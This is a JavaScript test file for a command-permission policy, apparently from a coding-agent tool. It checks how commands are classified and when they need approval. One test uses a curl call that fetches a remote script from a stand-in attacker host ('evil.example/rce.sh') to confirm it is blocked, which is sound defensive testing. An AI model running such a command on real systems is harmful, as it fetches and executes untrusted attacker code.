/**
 * tests/policy.test.js — command-policy classification and permission decisions.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { classifyCommand, isPermitted, CLASS } from "../src/core/policy.js";

test("classifyCommand: recognizes read-only, verification, and mutation commands", () => {
  assert.equal(classifyCommand("git", ["status"]).classification, CLASS.READ_ONLY);
  assert.equal(classifyCommand("npm", ["test"]).classification, CLASS.VERIFICATION);
  assert.equal(classifyCommand("npm", ["run", "lint"]).classification, CLASS.VERIFICATION);
  assert.equal(classifyCommand("npm", ["install"]).classification, CLASS.DEPENDENCY_MUTATION);
  assert.equal(classifyCommand("git", ["commit", "-m", "x"]).classification, CLASS.GIT_MUTATION);
  assert.equal(classifyCommand("npm", ["run", "dev"]).classification, CLASS.NETWORKED);
});

test("classifyCommand: distinguishes plain git reset from a --hard reset (destructive)", () => {
  assert.equal(classifyCommand("git", ["reset", "--hard"]).classification, CLASS.DESTRUCTIVE);
  assert.equal(classifyCommand("git", ["push", "--force"]).classification, CLASS.DESTRUCTIVE);
});

test("classifyCommand: refuses anything not on the allowlist, regardless of how it looks", () => {
  const r = classifyCommand("curl", ["http://evil.example/rce.sh"]);
  assert.equal(r.allowed, false);
  assert.equal(r.classification, null);
});

test("isPermitted: read-only/verification auto-run when config allows it, blocked when it doesn't", () => {
  assert.equal(isPermitted(CLASS.READ_ONLY, { chat: { autoRunReadOnly: true } }).permitted, true);
  assert.equal(isPermitted(CLASS.READ_ONLY, { chat: { autoRunReadOnly: false } }).permitted, false);
});

test("isPermitted: project/dependency/git mutations always require explicit approval", () => {
  for (const c of [CLASS.PROJECT_MUTATION, CLASS.DEPENDENCY_MUTATION, CLASS.GIT_MUTATION]) {
    assert.equal(isPermitted(c, {}, { approved: false }).permitted, false);
    assert.equal(isPermitted(c, {}, { approved: true }).permitted, true);
    assert.equal(isPermitted(c, {}).requiresApproval, true);
  }
});

test("isPermitted: destructive commands are refused even with approval unless explicitly allowed", () => {
  assert.equal(isPermitted(CLASS.DESTRUCTIVE, { security: { allowDestructiveCommands: false } }, { approved: true }).permitted, false);
  assert.equal(isPermitted(CLASS.DESTRUCTIVE, { security: { allowDestructiveCommands: true } }, { approved: true }).permitted, true);
});

test("isPermitted: networked commands are refused even with approval unless explicitly allowed", () => {
  assert.equal(isPermitted(CLASS.NETWORKED, { security: { allowNetworkCommands: false } }, { approved: true }).permitted, false);
  assert.equal(isPermitted(CLASS.NETWORKED, { security: { allowNetworkCommands: true } }, { approved: true }).permitted, true);
});
